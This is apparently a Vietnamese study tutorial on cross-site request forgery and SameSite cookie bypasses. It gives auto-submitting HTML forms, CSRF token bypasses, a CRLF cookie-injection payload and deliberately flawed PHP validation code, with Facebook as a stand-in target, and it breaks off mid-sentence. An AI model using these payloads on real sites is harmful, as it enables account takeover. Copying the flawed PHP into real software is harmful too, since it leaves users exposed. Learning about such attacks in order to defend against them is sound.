# CSRF-Cross-Site-Request-Forgery( Giả mạo yêu cầu chéo trang ) 

Là một lỗ hổng bảo mật cho phép kẻ tấn công lừa người dùng thực hiện một hành động trên trang web mà hành động đó không phải chủ đích của họ 

Nói dễ hiểu thì hacker mượn session của bạn và lén lút ra lệnh cho trang web thực hiện một điều gì đó ( đổi mật khẩu , chuyển tiền ,...) mà Server vẫn tưởng đó là yêu cầu từ bạn lên trang web

Ví dụ dễ hiểu như , giả sử trang web changeEmail.com có chức năng đổi email . Khi mà user đổi email thì sẽ có 1 request lên server như thế này 

```
POST /email/change HTTP/1.1
Host: changeEmail.com
Cookie: session=abc123456...
Content-Type: application/x-www-form-urlencođe

email=nạn_nhân@gmail.com
```

Khi đó kẻ tấn công sẽ tạo 1 trang web độc hại riêng chứa đoạn mã HTML ẩn tự động gửi request đến **changeEmail.com** với nội dung đổi email thành **hacker123@gmail.com**

đoạn mã trông như sau: 
```html
<form action="https://changeEmail.com/email/change" method="POST">
    <input type="hidden" name="email" value="hacker123@gmail.com" />
</form>
<script>
    document.forms[0].submit(); // Tự động gửi form ngay khi trang tải xong
</script>
```
kẻ tấn công lừa bạn click vào đường link độc hại đó , trình duyệt của bạn sẽ tự động gửi request đến **changeEmail.com** . Quan trọng nhất là trình duyệt tự động đính kèm cookie của bạn vào request gửi lên **changeEmail.com** đó và máy chủ ở **changeEmail.com** thấy cookie hợp lệ và tin rằng bạn đang yêu cầu đổi email và thực hiện lệnh -> Lúc này tài khoản bị chiếm đoạt

Cơ chế hoạt động: nó sẽ cần 3 thứ 

- Các hành động trong ứng dụng mà kẻ tấn công muốn thực hiện ( ví dụ đổi password , đổi email , cấp quyền admin , ... )
- Quản lí phiên bằng Cookie : ứng dụng chỉ dựa vào phiên ( session ) để xác nhận danh tính người dùng . Trình duyệt có cơ chế tự động gửi cookie này kèm theo mọi yêu cầu đến trang web đó
- Cuối cùng cần phải biết cái tham số tương ứng với mỗi hành động cần thực hiện ( như lúc nãy , cái tham số cần truyền vào để có thể đổi email đó chính là `email` )

***KHAI THÁC***

Thứ nhất là vượt qua mã CSRF 

Nói dễ hiểu , mã thông báo CSRF là 1 loại mã ngẫu nhiên tạo ra bởi máy chủ và đău cho máy khách , để thực hiện một hành động nhạy cảm như đổi mật khẩu thì phía Client phải gửi kèm theo mã CSRF đó đến máy chủ 

Hãy phân biệt rõ 2 loại hành động , giả sử chúng ta đang ở `https://facebook.com`

Hành động XEM ( GET request ) :
- ví dụ : đọc , lướt , xem post , xem profile , tìm kiếm thông tin 
- không cần CSRF Token bởi vì bạn chỉ nhìn thôi chứ ko thay đổi gì trong database của server cả

Hành động LÀM ( POST request ) : 
- ví dụ : Đổi mật khẩu , Comment , Like , đăng bài viết , ....
- tất cả những hành động trên đều làm thay đổi dữ liệu nên đều cần CSRF Token 
ví dụ như trên: khi mình click vào nút Like một post của trên Fb thì có 1 request gửi lên Server bao gồm cả mã CSRF
ở đây mã CSRF là cái dòng fb_dtsg kia
<img width="975" height="315" alt="image" src="https://github.com/user-attachments/assets/73fd61d9-6aab-4bca-b886-43a1026f3c89" />



Ví dụ từ portswigger:
```html
<form name="change-email-form" action="/my-account/change-email" method="POST">
    <label>Email</label>
    <input required type="email" name="email" value="example@normal-website.com">
    <input required type="hidden" name="csrf" value="50FaWgdOhi9M9wyna8taR1k3ODOR8d6u">
    <button class='button' type='submit'> Update email </button>
</form>
```
đoạn code trên mô tả cách SERVER gửi mã CSRF cho CLIENT của người dùng 
- Trong thẻ <form> để đổi email, ngoài trường nhập email bình thường thì hệ thống chèn thêm một dòng `<input required type="hidden" name="csrf" value="50FaWgdOhi9M9wyna8taR1k3ODOR8d6u">`
- 
`type="hidden"`: người dùng sẽ không nhìn thấy dòng này trên giao diện web, nó chạy ngầm

`value="50FaWgdOhi9M9wyna8taR1k3ODOR8d6u">`: đây mã CSRF ngẫu nhiên , mã này chỉ có tác dụng đối với phiên hoạt động hiện tại. Chỉ máy chủ và trình duyệt của bạn mới biết được đoạn mã random này 

và giả sử khi mà người dùng nhấn vào nút UPDATE EMAIL trình duyệt sẽ gửi một request POST lên SERVER 

(cre: portswigger) 
```
POST /my-account/change-email HTTP/1.1
Host: normal-website.com
Content-Length: 70
Content-Type: application/x-www-form-urlencoded

csrf=50FaWgdOhi9M9wyna8taR1k3ODOR8d6u&email=example@normal-website.com
```
như bạn đã thấy đó dữ liệu được gửi đi bao gồm cả email mới cần thay và mã CSRF 

***CÁC LỖI THƯỜNG GẶP TRONG QUÁ TRÌNH XÁC THỰC MÃ CSRF***

Thứ nhất , trong quá trình xác thực mã , chỉ một vài phương thức thực hiện việc xác thực

Dễ hiểu thì phía backend chỉ sử dụng việc xác thực mã với Method Post chứ ko thực hiện với Method Get 
```php
if($_SERVER['REQUEST_METHOD']==='POST'){
	checkToken($_POST['csrf']); // Chỉ check token nếu là POST
}
//Sau đó thực hiện hành động đổi mail 
changeMail($_REQUEST['email']; //$_REQUEST nhận cả GET và POST
```
Như đoạn code trên , nếu bạn gửi bằng method `POST` thì nó sẽ nhảy vào check mã CSRF ngay lập tức 

Nhưng nếu bạn gửi bằng method `GET` thì nó sẽ bỏ qua hoàn toàn cái check Token kia và thực hiện hành động đổi mail ngay lập tức

***Lab:*** 
Truy cập vào web Facebook và thực hiện thay đổi email 

Trên trang web Facebook, thử đổi email thành test@test.com và bấm nút Change Email 

Bắt được 1 request như sau :
```
POST /my-account/change-email HTTP/1.1
Host: Facebook.com
Cookie: session=...
Content-Type: application/x-www-form-urlencoded

email=test%40test.com&csrf=ABC123XYZ...
```
Vì đây đang là phương thức POST , nên ở đây server sẽ chặn lại và kiểm tra csrf 

Thử thay POST thành GET và đưa toàn bộ data ở dưới lên URL và cũng có thể xóa luôn cái tham số csrf đó đi 

và request cuối cùng sẽ là  
```
GET /my-account/change-email?email=test%40test.com HTTP/1.1
Host: Facebook.com
Cookie: session=...
Content-Type: application/x-www-form-urlencoded
```

Kết quả: Response trả về 302 Found hoặc 200 OK -> Thành công . Đã đổi được email   mà không cần mã CSRF

Ở bước trên , chúng ta đang tự test với chính mình do đang tự dùng session cookie của bản thân và xác nhận được rằng , có thể đổi email và bypass được phần check mã CSRF

Vậy tức là , chỉ khi thay session cookie của mình bằng session cookie của người khác thì có thể thực hiện được đổi email ngay trên tài khoản của họ 

chúng ta tạo một đoạn mã như sau: 
```html
<html>
<body>
<form action="facebook.com/my-account/change-email" method="POST">
	<input type="hidden" name="email" value="test@test.com">
	<input type="hidden" name="csrf" value="fakeCSRF">
</form>
<script>document.forms[0].submit()</script>
</body>
</html>
```
tạo 1 trang web rồi đưa đoạn code trên vào trang web . Nói cho dễ hiểu thì đoạn code trên nó chính là cái form Change Email đã nhập sẵn email rồi 

Bây giờ nếu gửi link trang web này cho người khác , họ click vào:

	- Trình duyệt gửi request đến ngay server của của trang web tự tạo kia -> tiếp tục trang web trả về đoạn code chúng ta tự viết trên cho trình duyệt 
	- Khi trình duyệt nhận và đọc đến dòng <script>document.forms[0].submit()</script> , thì thực thi lệnh , gửi tiếp 1 request khác lên facebook.com , lúc này không khác gì họ đang tự nói với server rằng hãy thay đổi email của tôi thành test@test.com , và hoàn toàn hợp lệ bởi vì trong request gửi đi , cookie bắt nguồn từ họ mà 


***Thứ hai , lỗi logic chỉ kiểm tra mã CSRF khi nó tồn tại***

```php
//Code ẩu
if (isset($_POST['csrf']){
	// nếu có tham số csrf thì mới check đúng sai
	if(!verifyToken($_POST['csrf'])){
		die("token csrf sai");
}
// nếu ko có tham số csrf thì ko nhảy vào nhánh check đúng sai và cho change Email luôn
changeEmail();
```

***Lấy lab tương tự như trên:*** 
```
POST /my-account/change-email HTTP/1.1
Host: Facebook.com
Cookie: session=...
Content-Type: application/x-www-form-urlencoded

email=test%40test.com
```
Lúc này request bạn gửi lên không được có tham số csrf vì có thì nó sẽ nhảy vào nhánh checkToken() và fail liền 

lúc này đoạn code để chúng ta bỏ vào trang web tự tạo sẽ là
```html
<html>
<body>
<form action="facebook.com/my-account/change-email" method="POST">
	<input type="hidden" name="emai" value="test@test.com">
</form>
<script>document.forms[0].submit()</script>
</body>
</html>
```

***Thứ ba , lỗi Token CSRF không được gắn với phiên dùng người dùng đó***

Quy trình chuẩn phải là: Token CSRF sinh ra từ user A thì user A mới được dùng , sinh ra từ user B thì user B mới được dùng

Nhưng mà ở đây , server nó lại tạo ra 1 kho chứa những TOken CSRF hợp lệ , người dùng gửi 1 Token CSRF -> server nó kiểm tra , cái này nằm trong kho, do server phát hành -> rồi cho qua 

Vấn đề ở đây là : Server nó không kiểm tra rằng , cái Token CSRF đó có thuộc về người đang gửi request đó hay không ? -> Có thể tận dụng chỗ này , lấy Token hợp lệ của mình rồi đưa cho người khác dùng 

Khi đó request gửi lên server sẽ là 
```
POST /my-account/change-email HTTP/1.1
Host: Facebook.com
Cookie: session=...
Content-Type: application/x-www-form-urlencoded

email=test%40test.com&csrf=TOKEN_CUA_MINH
```
Cách lấy Token ở đây như thế nào ? Bạn nhớ Token CSRF sẽ được tạo ra khi mà chúng ta vào bất cứ trang nào liên quan đến việc làm thay đổi dữ liệu trong DB hay là POST request . -> Bạn chỉ cần vào trang Change Email , bắt cái request đó lại là lấy được Token CSRF của chính mình

Và ghi nhớ là ko được bấm ngay vào nút Change Email để giữ cho Token này chưa được xài 

Tiếp theo , làm như lúc nãy , tạo 1 trang web chứa đoạn mã 
```html
<html>
<body>
<form action="facebook.com/my-account/change-email" method="POST">
	<input type="hidden" name="emai" value="test@test.com">
	<input type-"hidden" name="csrf" value="TOKEN_CUA_MINH">
</form>
<script>document.forms[0].submit()</script>
</body>
</html>
```

***Thứ tư , Token gắn với Cookie không thuộc Session***

Để giảm tải cho database ( không phải lưu token của hàng triệu user ) , một số lập trình viên dùng cơ chế Double Token 

Giải thích dễ hiểu đoạn này thì giả sử , khi bạn vào `facebook.com` , Server sẽ gửi đồng thời 2 cái 

- Thứ nhất là 1 response , có dòng Set-Cookie: token=abcxyz về cho trình duyệt và từ lần sau mỗi khi có request từ trình duyệt gửi lên thì sẽ là Cookie: token=abcxyz
- Thứ hai: Server nó sẽ trả về văn bản HTML và sẽ có dòng `<input type="hidden" name="csrf" value="abcxyz">` về cho trình duyệt , rồi trình duyệt sẽ tự gán `csrf=abcxyz` , bỏ dòng này vào body request mỗi lần gửi lên Server

Và ở đây , khi request gửi lên server thì nó so sánh 2 cái token kia có giống nhau hay không . NHƯNG  vấn đề ở đây là ,mỗi phiên làm việc khác nhau sẽ lại được cấp những token khác nhau mà back-end chỉ lập trình kiểm tra xem 2 token kia có giống nhau ko , còn lại 2 token có thuộc về session hiện tại hay ko thì ko cần biết

```php
$token_trong_cookie = $_COOKIE['csrfKey'];
$token_trong_form = $_POST['csrf'];
if ($token_trong_cookie === $token_trong_form) {
	updateEmail($_POST['email']);
}
```
TỪ ĐÂY , nếu chúng ta có thể sửa được `$token_trong_cookie` = abcxyz , `$token_trong_form` = abcxyz thì thế là bypass được , ko cần quan tâm đến token đó có thuộc về phiên làm việc hiện tại hay ko 

**LAB**:
Giả sử truy cập vào `facebook.com` , nhập vào ô search ấy chữ "mèo" , nhận thấy response trả về từ Server có Set-Cookie: LastSearchTerm=mèo và thế là từ giờ mỗi khi gửi request lên server sẽ bao gồm Cookie: LastSearchTerm=mèo

Thử injection , nhập vào `test%0d%0aSet-Cookie: csrf=xyzabc` và response đã trả về:
```
Set-Cookie: LastSearchTerm=test
Set-Cookie: csrf=xyzabc
```
vì sao lại được như vậy? bởi vì ở phía backend đã code như thế này 
```php
$tu_khoa = GET['search']; // 1. Lấy input từ ô search
$header_command = "Set-Cookie: LastSearchTerm=" . $tu_khoa; // 2. Nối chuỗi nhập vào với **Set-Cookie: LastSearchTerm=**
header($header_command); // 3. Gửi lệnh trả về cho trình duyệt
```
OK bây giờ chúng ta sẽ tạo đoạn code để đưa vào web dụ nạn nhân ấn vào 
```html
<form method="POST" action="https://facebook.com/my-account/change-email>
	<input type="hidden" name="email" value="hacker@evil.com">
    <input type="hidden" name="csrf" value="fake"> 
</form>

<script>
	// link search có chứa mã độc
	var link_tiem_cookie = "https://facebook.com/?search=test%0d%0aSet-Cookie%3a%20csrf=fake%3b%20SameSite=None";
	// tạo thẻ img ảo
	var img = new Image();
	// Gán đường dẫn search vào src của ảnh
	img.src = link_tiem_cookie;
	
	// 
	img.onerror = function(){
		// ngay khi tiêm cookie xong ( lỗi xảy ra ) , ra lệnh submit form
		document.forms[0].submit();
	}
</script>
```
Ở đoạn code trên khi mà chạy đến `img.src` thì trình duyệt nó sẽ gửi 1 request lên server để lấy ảnh , cái request nó sẽ có dạng như sau 
```
GET /?search=test%0d%0aSet-Cookie:csrf=fake%3bSameSite=None HTTP/1.1
Host: facebook.com
Cookie: session=abc123456789;  
Accept: image/avif,image/webp,image/apng,image/*,*/*;q=0.8 
User-Agent: Mozilla/5.0 ...
```
rồi tất cả những gì ở sau ?search được nối chuỗi`$header_command = "Set-Cookie: LastSearchTerm=" . $tu_khoa;` đã giải thích ở trên . Và vì sao lại có Samesite=None ở đây , Nếu mà ko có Samesite=None thì nó sẽ ko cho thực hiện việc gửi request chéo trang đâu ? Mục đích của nó là cho phép được Cross-Site

Thế là Cookie đã được set , sau đó nó chạy đến img.onerror và tự động submit 1 lần nữa tức là tự động gửi thêm 1 request lên `facebook.com` 

Có một đoạn khó hiểu ở đây là , vậy thế thì lỡ có 2 cookie xung đột ở đây thì sao ? Tức là khi người dùng ấn vào link thì request nó cũng sẽ bao gồm Cookie của người dùng . Và tất nhiên , cái Set-Cookie: kia nó sẽ ghi đè lên cookie của người dùng nên bạn không cần lo chuyện này .

# 2. Vượt qua các hạn chế của cookie SameSite

**Đầu tiên , cùng làm rõ "Site" là gì ?**

 Công thức của Site: Site = TLD + 1

 - TLD (Top-Level-Domain): Là phần đuôi mở rộng của tên miền như `.com` , `.net` , `.org`
 - TLD + 1: Là TLD cộng thêm một cấp tên miền ngay trước nó . Đây thường là tên miền chính , bạn thường bỏ tiền ra mua 
 - Ví dụ : nếu URL là `https://www.google.com thì **TLD** là `.com` và **Site** là `google.com`
 - Nếu URL là `https://maps.google.com` thì **TLD** là `.com` và **Site** vẫn là `google.com` , `maps` là subdomain ( tên miền phụ ) 

**Sự khác biệt giữa Site và Origin:**

 - Origin (Nguồn gốc): Hai URL phải giống nhau về 3 yếu tố: Giao thức (Scheme), Tên miền đầy đủ (Hostname) và Cổng (Port)
 - Site (Trang): Chỉ cần giống nhau về Giao thức + Site (TLD + 1)

**Để tìm hiểu lỗ hổng CSRF , bạn cần biết hai "người bảo vệ" của trình duyệt là SOP và SameSite .Chúng bảo vệ hai thứ khác nhau:**

 - SOP (Same Origin Policy): Bảo vệ dữ liệu (chống đọc trộm). Giả sử bạn đang ở `blog.media.com` (chứa lỗ hổng XSS) và muốn nhìn trộm số dư tài khoản ở trang `bank.media.com` .SOP sẽ so sánh 2 Origin. Thấy khác nhau -> SOP dựng lên 1 tường lên. Mã độc bên `blog` không thể đọc được số dư , tin nhắn, không lấy được nội dung từ `bank.media.com`
 - SameSite: Giả sử bạn đang ở `blog.media.com` , tuy không thấy gì ở `bank.media.com` nhưng bạn có thể thực hiện gửi lệnh chuyển tiền sang `bank.media.com` . Trình duyệt kiểm tra thấy cùng Site `media.com` -> Trình duyệt cho phép gửi request kèm Cookie đăng nhập. Vấn đề là Server `bank` nhận được Request mà có Cookie tưởng bạn gửi cho nên thực hiện chuyển tiền theo Request

Nói tóm lại thì SOP nó chặn không cho hacker nhìn thấy dữ liệu của bạn nhưng nó lại không chặn việc hacker gửi Request thay bạn (mặc dù đó không phải là hành động của bạn làm)

Chính vì SOP lờ đi việc gửi Request, nên kẻ tấn công mới lợi dụng lỗ hổng này thực hiện CSRF (gửi yêu cầu giả mạo). Và lúc đó chúng ta mới cần SameSite thật chặt chẽ để vá lại cái lỗ hổng SOP bỏ sót

**Vậy thì SameSite hoạt động như thế nào ?**

Nói dễ hiểu thì nó giống như một bộ lọc trước khi Request được gửi đi , nó sẽ quyết định việc có được gửi Cookie đi kèm theo Request hay không ?

Bạn hình dung là , trước mỗi lần gửi Request , SameSite sẽ giúp trình duyệt tự hỏi rằng: "Request này có phải là Cross-Site (chéo trang) hay không ?"

 - Nếu **KHÔNG** (bạn đang ở `bank.com` và gửi Request đến `bank.com`) , thì Request được gửi đi luôn được kèm với Cookie.

 - Nếu **CÓ** (bạn đang ở `blog.com` và gửi Request đến `bank.com`) , Nó sẽ dựa vào các tùy chọn được thiết lập cho SameSite để quyết định.

Có 3 Level chính của SameSite:

&nbsp; 1. `SameSite=Strict` (đây là options chặt chẽ nhất, an toàn nhất nhưng cũng gây phiền nhất)

&nbsp; - Quy tắc: trình duyệt chặn mọi Request chéo trang , bất kể là loại Request gì

&nbsp - Ví dụ: Bạn đang lướt `facebook.com` rồi bấm vào link `Instagram.com` , mặc dù trước đó bạn đã đăng nhập `Instagram.com` rồi nhưng mà nhưng bây giờ vẫn phải đăng nhập lại, do trình duyệt nó không gửi Request kèm với Cookie

&nbsp; - Tác dụng: Chặn hoàn toàn CSRF nhưng cứ mỗi lần bạn ở `Facebook.com` mà muốn qua `Instagram.com` thì lại phải đăng nhập lại từ đầu rất phiền phức.

&nbsp; 2. `SameSite=Lax` (lỏng lẻo - mức mặc định của Chrome)

&nbsp; - Đây là mức cân bằng giữa bảo mật và trải nghiệm, cũng là mức độ SameSite mà chúng ta sẽ thảo luận và trọng tâm của các kỹ thuật Bypass

&nbsp; - Quy tắc: trình duyệt sẽ chặn Cookie trong hầu hết các trường hợp chéo trang trừ những trường hợp thỏa mãn 2 điều kiện sau đây:

&nbsp; - Điều kiện thứ nhất: Request sử dụng phương thức GET và Điều kiện thứ hai: Request đó phải là Top-Level-Navigation (Thay đổi URL trên thanh địa chỉ)

&nbsp; - Ví dụ dễ hiểu như: chúng ta đang ở trong `blog.com` vốn dĩ chỉ có đọc và lướt blog , nhưng hacker đã chèn thêm 1 dòng `<img src="http://bank.com/transfer?amount=1000">`

Bình thường `<img src="http://nguon_anh_mot_con_me0">` thì đây không chỉ là dòng lệnh hiển thị ảnh mà nó đã gửi 1 Request đến Server để yêu cầu server đưa cho trang web hình ảnh con mèo để hiển thị 

Và cũng tương tự như thế , nếu hacker thay hiển thị ảnh bằng `<img src="http://bank.com/transfer?amount=1000">` thì trình duyệt cũng sẽ gửi 1 request lên server . Để hiểu rõ hơn thì Request nó gửi lên sẽ có dạng thế này:
```
GET /transfer?amount=1000 HTTP/1.1
Host: bank.com
Cookie: session_id=abcxyz      (có hoặc ko có tùy theo options SameSite)
Referer: http://blog.com
Accept: image/avif,image/webp,image/apng,image/svg+xml,image/*,*/*;q=0.8
User-Agent: Mozilla/5.0
Connection: keep-alive
```
Vì dùng thẻ `<img>` nên trình duyệt bắt buộc phải dùng `GET` , vậy là thỏa mãn điều kiện đầu tiên , tiếp tục ở đây `SameSite=Lax` , nếu mà cái Request gửi lên nó không làm thay đổi URL trên thanh địa chỉ tức là nó đang chạy ngầm trong trình duyệt , thì lúc này cái Request gửi lên đó nó sẽ không bao gồm Cookie. Bạn hình dung cái điều kiện thứ 2: Top-Level-Navigation nó giống như việc bạn đang ở `facebook.com` mà bạn click vào 1 link `ins.com` thì lúc này sẽ chuyển hướng cả URL trên thanh địa chỉ của bạn từ `facebook.com` sang `ins.com` , chỉ khi thỏa mãn thêm điều kiện này thì Cookie mới được bao gồm ở trong Request.

Để giải thích thêm đoạn này . Giả sử bây giờ Hacker muốn thực hiện 1 hành động chuyển tiền trên tài khoản của bạn thì cái cần thiết là phải có Cookie của bạn đúng chứ ? Vậy thì việc mà Request được gửi đi mà không bao gồm Cookie thì cái Request cũng sẽ trở nên vô nghĩa, Hacker sẽ phải đăng nhập . 

Dòng `Accept: image` dấu hiệu đặc trưng của thẻ `<img>` , tức là trình duyệt đang đợi Server sẽ trả về dữ liệu định dạng **ẢNH** , nhưng điểm mấu chốt ở đây là SERVER nó nhìn thấy lệnh đến `/transfer` cho nên nó sẽ thực hiện chuyển tiền trước , còn sau khi thực hiện lệnh xong kết quả như nào thì sẽ trả về theo ảnh hay theo text thì tính sau.

Thêm nữa, dòng `Referer: http://blog.com` cho biết Request này xuất phát từ web nào 

&nbsp; 3. `SameSite=None` 

&nbsp; - Quy tắc: Trình duyệt luôn gửi Cookie trong mọi Request bất kể trường hợp nào , Cùng Site hay khác Site, bất kể là POST hay GET. Và bắt buộc bật thêm cờ `Secure` (tức là chỉ được gửi qua HTTPS). Điều này là bắt buộc , nó giống như một quy luật bắt buộc (có thể hiểu như là một bộ luật được đưa ra phải chấp hành nếu bạn dùng `None`) 

Giả sử khi bạn vào `Facebook.com` thì sẽ có 1 response trả về từ Server Facebook và có dòng `Set-Cookie: session_id=xyz; SameSite=None` thiếu chữ `Secure` . Trình duyệt nhận được gói tin , đọc thấy `SameSite=None` mà không có cờ `Secure` , Trình duyệt sẽ ngay lập tức vứt bỏ Cookie này , Nó sẽ hiển thị một thông báo vàng hoặc đỏ trong tab Console của F12 `***Wait! This cookie was blocked because it has the 'SameSite=None' attribute but is missing the 'Secure' attribute.***`

&nbsp; - Ứng dụng của `SameSite=None`: Dùng cho các dịch vụ muốn hoạt động ngầm bên trong trang Web (như là nút Like Facebook ,...) , Nếu không để `None` thì tính năng đó sẽ bị lỗi (ví dụ nút Like Facebook sẽ không hiện ra thông báo đã Like)

# **Cách vượt qua `SameSite`**

**1. Vượt qua `SameSite Lax` bằng cách ghi đè phương thức**

&nbsp; Vấn đề: Bạn muốn tấn công CSRF để đổi email của nạn nhân. Nhưng Server yêu cầu phương thức POST để đổi email (chuẩn bảo mật hiện nay). Trình duyệt (nạn nhân) đang dùng `SameSite=Lax` . Nó chặn Cookie nếu bạn gửi POST từ trang khác và cho phép Cookie nếu là GET

&nbsp; Gửi `POST` thì trình duyệt nó mới chịu xử lý nhưng mà không có Cookie đi kèm -> Failed . Gửi `GET` thì SERVER lại lỗi ***405 METHOD NOT ALLOWED***

&nbsp; Giải pháp ở đây là dùng kỹ thuật **"Method Override"**: Bạn cứ hiểu rằng 

	


